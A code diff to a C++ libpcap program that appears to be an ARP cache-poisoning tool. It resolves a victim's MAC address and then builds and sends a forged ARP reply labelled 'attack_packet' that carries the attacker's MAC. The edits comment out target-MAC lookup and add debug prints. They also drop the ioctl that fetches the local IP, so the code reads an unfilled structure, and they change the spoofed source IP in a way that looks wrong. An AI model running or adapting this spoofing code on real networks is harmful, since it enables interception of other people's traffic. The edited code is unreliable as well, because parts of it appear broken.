@@ -16,6 +16,9 @@
 
 using namespace std;
 
+char my_mac[18] = "";
+char my_ip[15] = "";
+
 #pragma pack(push, 1)
 struct EthArpPacket final {
     EthHdr eth_;
@@ -62,7 +65,7 @@ void formatMacAddress(char* mac) {
     memcpy(mac, formattedMac , 18);
 }
 
-void get_MAC_IP_Address(const char *iface, uint8_t *mac, uint8_t *ip) {
+void get_my_Adr(const char *iface, uint8_t *mac, uint8_t *ip) {
     struct ifreq ifr;
     int fd;
 
@@ -81,11 +84,6 @@ void get_MAC_IP_Address(const char *iface, uint8_t *mac, uint8_t *ip) {
     }
     memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
 
-    if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
-        perror("ioctl");
-        close(fd);
-        exit(EXIT_FAILURE);
-    }
     struct sockaddr_in* ipaddr = reinterpret_cast<struct sockaddr_in*>(&ifr.ifr_addr);
     memcpy(ip, &ipaddr->sin_addr.s_addr, sizeof(ipaddr->sin_addr.s_addr));
 
@@ -104,16 +102,16 @@ int main(int argc, char* argv[]) {
     uint8_t inface_mac[6];
     uint8_t interface_ip[4];
 
-    char my_mac[18];
-    char my_ip[16];
+
     char* dev = argv[1];
 
-    get_MAC_IP_Address(dev, inface_mac, interface_ip);
+    get_my_Adr(dev, inface_mac, interface_ip);
 
-    sprintf(my_mac, "%02x:%02x:%02x:%02x:%02x:%02x",
+
+    sprintf(my_mac,"%02x:%02x:%02x:%02x:%02x:%02x",
             inface_mac[0], inface_mac[1], inface_mac[2],
             inface_mac[3], inface_mac[4], inface_mac[5]);
-    sprintf(my_ip, "%d.%d.%d.%d",
+    sprintf(my_ip,"%d.%d.%d.%d",
             interface_ip[0], interface_ip[1], interface_ip[2], interface_ip[3]);
 
     printf("MAC: %s\n", my_mac);
@@ -122,13 +120,14 @@ int main(int argc, char* argv[]) {
 
     int cnt = ( argc -2 ) / 2;
 
+    char errbuf[PCAP_ERRBUF_SIZE];
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+    if (handle == nullptr) {
+        fprintf(stderr, "pcap_open_live(%s) return nullptr - %s\n", dev, errbuf);
+        return -1;
+    }
+
     for(int i = 0 ; i < cnt ; i++ ){
-        char errbuf[PCAP_ERRBUF_SIZE];
-        pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
-        if (handle == nullptr) {
-            fprintf(stderr, "pcap_open_live(%s) return nullptr - %s\n", dev, errbuf);
-            return -1;
-        }
 
         EthArpPacket to_send_packet;
 
@@ -159,6 +158,10 @@ int main(int argc, char* argv[]) {
             int ret = pcap_next_ex(handle, &header, &reply_packet);
             if (ret == 1) {
                 EthArpPacket* reply = (struct EthArpPacket*)reply_packet;
+                if((uint16_t *)(reply->eth_.type()) == (uint16_t *)EthHdr::Arp){
+                    printf("%u\n",reply->arp_.sip());
+                    printf("%u\n",Ip(argv[2+(i*2)]));
+                }
                 if((uint16_t *)(reply->eth_.type()) == (uint16_t *)EthHdr::Arp &&
                     Ip(argv[2+(i*2)]) == reply->arp_.sip()){
                     ether_ntoa_r((const struct ether_addr*)&reply->eth_.smac_, sender_mac);
@@ -167,53 +170,61 @@ int main(int argc, char* argv[]) {
             }
         }
 
-        EthArpPacket to_target_packet;
 
-        to_target_packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
-        to_target_packet.eth_.smac_ = Mac(my_mac);
-        to_target_packet.eth_.type_ = htons(EthHdr::Arp);
+        // char errbuf[PCAP_ERRBUF_SIZE];
+        // pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+        // if (handle == nullptr) {
+        //     fprintf(stderr, "pcap_open_live(%s) return nullptr - %s\n", dev, errbuf);
+        //     return -1;
+        // }
 
-        to_target_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-        to_target_packet.arp_.pro_ = htons(EthHdr::Ip4);
-        to_target_packet.arp_.hln_ = Mac::SIZE;
-        to_target_packet.arp_.pln_ = Ip::SIZE;
-        to_target_packet.arp_.op_ = htons(ArpHdr::Request);
-        to_target_packet.arp_.smac_ = Mac(my_mac);
-        to_target_packet.arp_.sip_ = htonl(Ip(my_ip));
-        to_target_packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
-        to_target_packet.arp_.tip_ = htonl(Ip(argv[3+(i*2)]));
+        // EthArpPacket to_target_packet;
 
-        int res1 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&to_target_packet), sizeof(EthArpPacket));
-        if (res1 != 0) {
-            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res1, pcap_geterr(handle));
-        }
+        // to_target_packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
+        // to_target_packet.eth_.smac_ = Mac(my_mac);
+        // to_target_packet.eth_.type_ = htons(EthHdr::Arp);
 
-        char target_mac[18];
+        // to_target_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+        // to_target_packet.arp_.pro_ = htons(EthHdr::Ip4);
+        // to_target_packet.arp_.hln_ = Mac::SIZE;
+        // to_target_packet.arp_.pln_ = Ip::SIZE;
+        // to_target_packet.arp_.op_ = htons(ArpHdr::Request);
+        // to_target_packet.arp_.smac_ = Mac(my_mac);
+        // to_target_packet.arp_.sip_ = htonl(Ip(my_ip));
+        // to_target_packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
+        // to_target_packet.arp_.tip_ = htonl(Ip(argv[3+(i*2)]));
 
-        while (true) {
-            int ret = pcap_next_ex(handle, &header, &reply_packet);
-            if (ret == 1) {
-                EthArpPacket* reply = (struct EthArpPacket*)reply_packet;
-                // if((uint16_t *)(reply->eth_.type()) == (uint16_t *)EthHdr::Arp){
-                //     printf("%u\n",reply->arp_.sip());
-                //     printf("%u\n",Ip(argv[3+(i*2)]));
-                // }
-                if((uint16_t *)(reply->eth_.type()) == (uint16_t *)EthHdr::Arp &&
-                    Ip(argv[3+(i*2)]) == reply->arp_.sip()){
-                    ether_ntoa_r((const struct ether_addr*)&reply->eth_.smac_, target_mac);
-                    break;
-                }
-            }
-        }
+        // int res1 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&to_target_packet), sizeof(EthArpPacket));
+        // if (res1 != 0) {
+        //     fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res1, pcap_geterr(handle));
+        // }
+
+        // char target_mac[18];
+
+        // while (true) {
+        //     int ret = pcap_next_ex(handle, &header, &reply_packet);
+        //     if (ret == 1) {
+        //         EthArpPacket* reply = (struct EthArpPacket*)reply_packet;
+        //         // if((uint16_t *)(reply->eth_.type()) == (uint16_t *)EthHdr::Arp){
+        //         //     printf("%u\n",reply->arp_.sip());
+        //         //     printf("%u\n",Ip(argv[3+(i*2)]));
+        //         // }
+        //         if((uint16_t *)(reply->eth_.type()) == (uint16_t *)EthHdr::Arp &&
+        //             Ip(argv[3+(i*2)]) == reply->arp_.sip()){
+        //             ether_ntoa_r((const struct ether_addr*)&reply->eth_.smac_, target_mac);
+        //             break;
+        //         }
+        //     }
+        // }
 
         formatMacAddress(sender_mac);
-        formatMacAddress(target_mac);
+        //formatMacAddress(target_mac);
 
         printf("my mac : %s\n",my_mac);
         printf("my ip : %s\n", my_ip);
         printf("sender mac : %s\n", sender_mac);
         printf("sender ip : %s\n",argv[2+(i*2)]);
-        printf("target mac : %s\n", target_mac);
+        // printf("target mac : %s\n", target_mac);
         printf("target ip : %s\n",argv[3+(i*2)]);
 
         //여기까지 받은데이터로 ip 주소별로 mac을 키로 만들어서 저장
@@ -231,7 +242,7 @@ int main(int argc, char* argv[]) {
         attack_packet.arp_.pln_ = Ip::SIZE;
         attack_packet.arp_.op_ = htons(ArpHdr::Reply);
         attack_packet.arp_.smac_ = Mac(my_mac);
-        attack_packet.arp_.sip_ = htonl(Ip(argv[3+(i*2)]));
+        attack_packet.arp_.sip_ = htonl(Ip(argv[2+(i*2)]));
         attack_packet.arp_.tmac_ = Mac(sender_mac);
         attack_packet.arp_.tip_ = htonl(Ip(argv[2+(i*2)]));
 
